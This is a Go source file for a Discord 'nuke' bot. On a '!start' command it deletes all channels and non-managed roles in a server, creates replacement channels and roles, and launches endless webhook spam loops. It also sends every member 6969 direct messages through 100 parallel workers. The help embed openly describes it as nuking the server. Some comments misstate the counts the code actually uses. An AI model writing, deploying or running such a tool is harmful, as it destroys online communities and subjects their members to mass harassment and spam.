package main

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"

	"github.com/fatih/color"
	"github.com/joho/godotenv"
	"github.com/BurntSushi/toml"
	"github.com/bwmarrin/discordgo"
)

var (
	Token string
)

type Config struct {
	RoleName           string
	ChannelName        string
	WebhookName        string
	WebhookSpamMessage string
	TTS                bool
	ProfilePictureLink string
	ProfilePictureName string
	ShouldMassDM       bool
	MassDMMessage      string

	NumChannels            int
	NumWebhooksPerChannel  int
	NumRoles               int
}

func init() {
    err := godotenv.Load()
    if err != nil {
		color.Red("❌ Error loading .env file")
    }
    Token = os.Getenv("TOKEN")
}

func main() {
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		color.Red("❌ Error creating Discord session:", err)
		return
	}

	dg.AddHandler(messageCreate)
	// give the bot all the intents it needs
	dg.Identify.Intents = discordgo.MakeIntent(discordgo.IntentsAll)

	err = dg.Open()
	if err != nil {
		color.Red("❌ Error opening connection:", err)
		return
	}

	color.Green("✅ Bot is now running. Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	dg.Close()
}

func deleteChannels(s *discordgo.Session, guildID string) {
	channels, err := s.GuildChannels(guildID)
	if err != nil {
		color.Red("❌ Error fetching channels:", err)
		return
	}
	for _, channel := range channels {
		_, err := s.ChannelDelete(channel.ID)
		if err != nil {
			color.Red("❌ Error deleting channel:", err)
		}
	}
}

func createChannel(s *discordgo.Session, guildID, configPath string, numChannels, numWebhooksPerChannel int) {
	var config Config
	if _, err := toml.DecodeFile(configPath, &config); err != nil {
		color.Red("❌ Error decoding config file:", err)
		return
	}
	var wg sync.WaitGroup
	for i := 0; i < numChannels; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			channel, err := s.GuildChannelCreate(guildID, fmt.Sprintf("%s-%d", config.ChannelName, i), discordgo.ChannelTypeGuildText)
			if err != nil {
				color.Red("❌ Error creating channel:", err)
				return
			}
			for j := 0; j < numWebhooksPerChannel; j++ {
				webhook, err := s.WebhookCreate(channel.ID, fmt.Sprintf("%s-%d", config.WebhookName, j), "")
				if err != nil {
					color.Red("❌ Error creating webhook:", err)
				} else {
					go func() {
						for {
							// Create a new webhook message
							message := &discordgo.WebhookParams{
								Content:   config.WebhookSpamMessage,
								Username:  webhook.Name,
								AvatarURL: config.ProfilePictureLink,
								TTS:       config.TTS,
							}
							// Send the message
							_, err := s.WebhookExecute(webhook.ID, webhook.Token, false, message)
							if err != nil {
								color.Red("❌ Error sending webhook message:", err)
							}
						}
					}()
				}
			}
		}(i)
	}
	wg.Wait()
}

func deleteRoles(s *discordgo.Session, guildID string) {
	roles, err := s.GuildRoles(guildID)
	if err != nil {
		color.Red("❌ Error fetching roles:", err)
		return
	}
	for _, role := range roles {
		if role.Managed {
			// Skip bot roles
			continue
		}
		err := s.GuildRoleDelete(guildID, role.ID)
		if err != nil {
			color.Red("❌ Error deleting role:", err)
		}
	}
}

func createRole(s *discordgo.Session, guildID, configPath string, numRoles int) {
	var config Config
	if _, err := toml.DecodeFile(configPath, &config); err != nil {
		color.Red("❌ Error decoding config file:", err)
		return
	}
	for i := 0; i < numRoles; i++ {
		role, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{Name: fmt.Sprintf("%s-%d", config.RoleName, i)})
		if err != nil {
			color.Red("❌ Error creating role:", err)
			return
		}
		_, err = s.GuildRoleEdit(guildID, role.ID, &discordgo.RoleParams{Name: fmt.Sprintf("%s-%d", config.RoleName, i)})
		if err != nil {
			color.Red("❌ Error editing role:", err)
		}
	}
}

func sendDMs(s *discordgo.Session, guildID, configPath string) {
	var config Config
	if _, err := toml.DecodeFile(configPath, &config); err != nil {
		color.Red("❌ Error decoding config file:", err)
		return
	}
	if !config.ShouldMassDM {
		return
	}

	// Create a channel to send members to the workers
	memberChan := make(chan *discordgo.Member)

	// Start the workers
	for i := 0; i < 100; i++ {
		go func() {
			for member := range memberChan {
				channel, err := s.UserChannelCreate(member.User.ID)
				if err != nil {
					color.Red("❌ Error creating DM channel:", err)
					continue
				}
				for i := 0; i < 6969; i++ {
					_, err = s.ChannelMessageSend(channel.ID, config.MassDMMessage)
					if err != nil {
						color.Red("❌ Error sending DM:", err)
					}
				}
			}
		}()
	}

	// Fetch members and send them to the workers
	var after string // ID of the last member fetched
	for {
		members, err := s.GuildMembers(guildID, after, 1000) // Request 1000 members at a time
		if err != nil {
			color.Red("❌ Error fetching guild members:", err)
			return
		}
		if len(members) == 0 {
			break
		}

		for _, member := range members {
			memberChan <- member
		}

		after = members[len(members)-1].User.ID
	}

	// Close the channel to signal to the workers that no more members will be sent
	close(memberChan)
}
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	_, err := s.State.Channel(m.ChannelID)
	if err != nil {
		_, err = s.Channel(m.ChannelID)
		if err != nil {
			color.Red("❌ Error fetching channel:", err)
			return
		}
	}

	// Check if the message content starts with "!"
	if strings.HasPrefix(m.Content, "!") {
		// Split the message content into command and arguments
		args := strings.Fields(m.Content)
		command := args[0][1:] // Remove the "!" prefix

		switch command {
		case "start":
			color.Green("✅ Received !start command")
			var config Config
			if _, err := toml.DecodeFile("config.toml", &config); err != nil {
				color.Red("❌ Error decoding config file:", err)
				return
			}
			go deleteChannels(s, m.GuildID)
			go createChannel(s, m.GuildID, "config.toml", config.NumChannels, config.NumWebhooksPerChannel)
			go deleteRoles(s, m.GuildID)
			go createRole(s, m.GuildID, "config.toml", config.NumRoles)
			go sendDMs(s, m.GuildID, "config.toml")
		case "deleteChannels":
			color.Green("✅ Received !deleteChannels command")
			go deleteChannels(s, m.GuildID)
		case "createChannel":
			color.Green("✅ Received !createChannel command")
			go createChannel(s, m.GuildID, "config.toml", 35, 1) // create 35 channels and 10 webhooks in each channel
		case "deleteRoles":
			color.Green("✅ Received !deleteRoles command")
			go deleteRoles(s, m.GuildID)
		case "createRole":
			color.Green("✅ Received !createRole command")
			go createRole(s, m.GuildID, "config.toml", 1) // create 250 roles
		case "sendDMs":
			color.Green("✅ Received !sendDMs command")
			go sendDMs(s, m.GuildID, "config.toml") // send DMs
		case "help":
			color.Green("✅ Received !help command")
			helpEmbed := &discordgo.MessageEmbed{
				Title: "Help",
				Description: `
		Here are the commands you can use:
		!start - Nukes the server by creating channels, webhooks, roles, and sending DMs
		!deleteChannels - Deletes all channels
		!createChannel - Creates new channels
		!deleteRoles - Deletes all roles
		!createRole - Creates new roles
		!sendDMs - Sends DMs to all members
		`,
				Color: 0x00ff00, // Green color
			}
		
			// Create a DM channel with the user
			channel, err := s.UserChannelCreate(m.Author.ID)
			if err != nil {
				color.Red("❌ Error creating DM channel:", err)
				return
			}
		
			// Send the help message to the DM channel
			_, err = s.ChannelMessageSendEmbed(channel.ID, helpEmbed)
			if err != nil {
				color.Red("❌ Error sending help message. Please make sure you have DMs enabled in this server.")
			}

		default:
			color.Red("❌ Unknown command:", command)
		}
	}
}
